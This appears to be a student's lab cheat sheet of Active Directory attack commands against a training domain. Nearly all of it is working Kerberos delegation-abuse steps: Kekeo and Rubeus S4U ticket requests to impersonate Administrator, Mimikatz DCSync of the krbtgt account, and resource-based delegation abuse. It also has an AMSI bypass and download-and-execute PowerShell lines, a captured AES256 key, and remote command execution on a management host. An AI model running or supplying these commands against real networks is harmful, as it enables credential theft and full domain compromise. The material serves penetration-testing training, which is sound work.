# ENUMERATE USERS AND COMPUTERS WITH CONTRAINED DELEGATION ENABLED

Get-DomainUser -TrustedToAuth

## CHECK msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC} ## 

Get-DomainComputer -TrustedToAuth

# EITHER PLAINTEXT PASSWORD OR NTLM HASH/AESKEY IS REQUIRED

# Using asktgt from Kekeo, we request a TGT 
kekeo tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:<rc4>

# Using s4u from Kekeo, we request a TGS
tgs::s4u /tgt:<tgt> /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local

# ABUSE IT USING RUBEUS (REQUESTING TGT AND TGS IN A SINGLE COMMAND)
Rubeus.exe s4u /user:websvc /aes256:<aes256> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.local /ptt
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

# LDAP ACCESS (FOR DCSYNC ATTACK)
# USING ASKTGT from KEKEO we REQUEST A TGT
kekeo tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:<rc4>

# USING s4u from KEKEO_one (no SNAME validation)
# SERVICE INFO IS IN MSDS-ALLOWEDTODELEGATETO IN GET-DOMAINCOMPUTER -TRUSTEDTOAUTH
tgs::s4u /tgt:<tgt> /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.local|ldap/dcorp-dc.dollarcorp.moneycorp.local

# USING MIMIKATZ
Invoke-Mimikatz -Command '"kerberos::ptt <ticket>"'
->dcsync now<-
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# USING RUBEUS 
# We can abuse contrained delegation for dcorp-adminsrv$ (Requests a tgt and tgs in a single command)
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<aes256> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollacorp.moneycorp.local /altservice:ldap /ptt
->dcsync now<-
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

#################### RESOURCE-BASED CONSTRAINED DELEGATION ####################

# We already have admin privileges on student VMs that are domain joined machines
# Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'ciadmin'}

# In the CI machine for example to connect to the MGMT machine.
We got the reverse shell
iex (iwr... sbloggingbypass.txt -UseBasicParsing)
AMSI BYPASS
iex (New-Object... PowerView.ps1)

# COMMANDS
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student575$|dcorp-std575$' -Verbose
Get-DomainRBCD

# WE NEED AES256 OF STUDENT575 
C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit" from a locally elevated shell

# NOW USE RUBEUS FROM A LOCAL SHELL (in student vm)
Rubeus.exe s4u /user:dcorp-std575$ /aes256:873611228c73d17456c010b2ac127331b8e774cd6a9ac3e668b659d06ca0af8b /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
klist 

now we can winrs -r:dcorp-mgmt cmd.exe WE RUN THE PROCESS AS ADMINISTRATOR.

